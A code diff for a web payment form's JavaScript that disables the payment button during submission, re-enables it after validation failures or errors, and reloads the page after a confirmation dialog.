@@ -44,6 +44,10 @@ document.addEventListener('DOMContentLoaded', () => {
     cardDialog.showModal();
   };
 makePaymentBtn.onclick = async () => {
+  // Disable button immediately to stop multi-click
+  makePaymentBtn.disabled = true;
+  makePaymentBtn.textContent = "Processing...";
+
   const form = document.getElementById('cardForm');
 
   const cardData = {
@@ -59,10 +63,13 @@ makePaymentBtn.onclick = async () => {
     amount: depositAmount
   };
 
-
   // Basic validation
   if (!cardData.cardNumber || !cardData.cvv || !cardData.expiry || !cardData.firstName || !cardData.lastName) {
     alert("Please fill in all required fields.");
+
+    // Re-enable button if validation fails
+    makePaymentBtn.disabled = false;
+    makePaymentBtn.textContent = "Make Payment";
     return;
   }
 
@@ -77,16 +84,18 @@ makePaymentBtn.onclick = async () => {
     const data = await res.json();
     if (!res.ok) throw new Error(data.message || "Card submission failed.");
 
-    cardDetails = cardData; // Store for next step (code entry)
+    cardDetails = cardData;
     cardDialog.close();
     codeDialog.showModal();
   } catch (err) {
     console.error('❌ Failed to submit card details:', err);
     alert(err.message || "Failed to submit card details.");
+
+    // Re-enable on error
+    makePaymentBtn.disabled = false;
+    makePaymentBtn.textContent = "Make Payment";
   }
 };
-
-
 
   document.getElementById('codeForm').addEventListener('submit', async (e) => {
     e.preventDefault();
@@ -114,6 +123,11 @@ makePaymentBtn.onclick = async () => {
       setTimeout(() => {
         loadingDialog.close();
         confirmDialog.showModal();
+
+          // Auto refresh after 2 seconds
+  setTimeout(() => {
+    window.location.reload();
+  }, 3000);
       }, 3000);
       e.target.reset();
       closeDialog('codeDialog');
